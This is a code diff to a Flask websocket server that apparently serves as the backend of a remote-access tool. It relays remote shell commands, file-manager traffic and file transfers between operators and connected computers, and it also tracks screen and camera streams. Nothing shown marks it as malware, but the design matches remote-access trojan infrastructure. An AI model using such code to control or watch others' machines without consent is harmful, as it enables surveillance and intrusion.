@@ -18,8 +18,14 @@ app = Flask(__name__)
 sock = Sock(app)
 command = {}
 
-shell_commands = {}                
-shell_response = {}
+shell_clients = {}
+shell_computers = {}
+
+manager_clients = {}
+manager_computers = {}
+
+files_clients = {}
+files_computers = {}
 
 screen_recv_ws = {}
 camera_recv_ws = {}
@@ -247,7 +253,6 @@ def update(ws):
 
         ws.send(json.dumps(connectedComputers))
 
-
 @sock.route("/api/ws/computers")
 def computers(ws):
     global connectedComputers
@@ -264,69 +269,165 @@ def computers(ws):
         command = json.loads(ws.receive())
         print(command)
 
-
 @sock.route("/api/ws/readShell")
 def readshell(ws):
-    global shell_response
+    global shell_computers
+
     data = ws.receive()
     encoded = hashlib.sha256(data.encode()).hexdigest()
+
     print(encoded)
+    
     if not encoded == key:
         ws.close()
 
     computer = ws.receive()
-    threading.Thread(
-        target=listen,
-        args=(
-            ws,
-            computer,
-        ),
-    ).start()
+
+    shell_clients[computer] = ws
+
     while True:
 
-        if computer in shell_response and shell_response[computer]:
-            print(shell_response)
-            ws.send(shell_response[computer])
-            shell_response[computer] = None
+        recv_data = ws.receive()
+        if computer not in shell_computers:
+            continue
 
-
-def listen(ws, computer):
-    global shell_commands
-    while True:
-        print('test')
-        shell_commands[computer] = ws.receive()
-        print(shell_commands)
-
-
-def send(ws, computer):
-    global shell_commands
-    while True:
-        if computer in shell_commands and shell_commands[computer]:
-            ws.send(shell_commands[computer])
-            shell_commands[computer] = None
-
+        try:
+            shell_computers[computer].send(recv_data)
+        except:
+            del shell_computers[computer]
 
 @sock.route("/api/ws/shell")
 def shell(ws):
-    global shell_response
+    global shell_clients
+
     data = ws.receive()
     encoded = hashlib.sha256(data.encode()).hexdigest()
+
     print("SHELL")
+
     if not encoded == key:
         ws.close()
 
     computer = ws.receive()
 
-    threading.Thread(
-        target=send,
-        args=(
-            ws,
-            computer,
-        ),
-    ).start()
-    while True:
-        shell_response[computer] = ws.receive()
+    shell_computers[computer] = ws
 
+    while True:
+        recv_data = ws.receive()
+
+        if computer not in shell_clients:
+            continue
+
+        try:
+            shell_clients[computer].send(recv_data)
+        except:
+            del shell_clients[computer]
+
+@sock.route("/api/ws/FileManager")
+def readmanager(ws):
+    global manager_computers
+    data = ws.receive()
+    encoded = hashlib.sha256(data.encode()).hexdigest()
+
+    print(encoded)
+
+    if not encoded == key:
+        ws.close()
+
+    computer = ws.receive()
+
+    manager_clients[computer] = ws
+
+    while True:
+
+        recv_data = ws.receive()
+        if computer not in manager_computers:
+            continue
+
+        try:
+            manager_computers[computer].send(recv_data)
+        except:
+            del manager_computers[computer]
+
+@sock.route("/api/ws/manager")
+def manager(ws):
+    global manager_clients
+
+    data = ws.receive()
+    encoded = hashlib.sha256(data.encode()).hexdigest()
+
+    print("FILE MANAGER")
+
+    if not encoded == key:
+        ws.close()
+
+    computer = ws.receive()
+
+    manager_computers[computer] = ws
+
+    while True:
+        recv_data = ws.receive()
+
+        if computer not in manager_clients:
+            continue
+
+        try:
+            manager_clients[computer].send(recv_data)
+        except:
+            del manager_clients[computer]
+
+@sock.route("/api/ws/readFiles")
+def readfiles(ws):
+    global files_computers
+    data = ws.receive()
+    encoded = hashlib.sha256(data.encode()).hexdigest()
+
+    print(encoded)
+
+    if not encoded == key:
+        ws.close()
+
+    computer = ws.receive()
+
+    files_clients[computer] = ws
+
+    while True:
+
+        recv_data = ws.receive()
+        if computer not in files_computers:
+            continue
+
+        try:
+            files_computers[computer].send(recv_data)
+        except:
+            del files_computers[computer]
+
+@sock.route("/api/ws/files")
+def files(ws):
+    global files_clients
+
+    data = ws.receive()
+    encoded = hashlib.sha256(data.encode()).hexdigest()
+
+    print("FILES")
+
+    if not encoded == key:
+        ws.close()
+
+    computer = ws.receive()
+
+    files_computers[computer] = ws
+
+    while True:
+        recv_data = ws.receive()
+
+        if computer not in files_clients:
+            continue
+
+        try:
+            files_clients[computer].send(recv_data)
+        except:
+            del files_clients[computer]
 
 @app.route("/webhook", methods=["POST", "GET"])
 def webhook():  
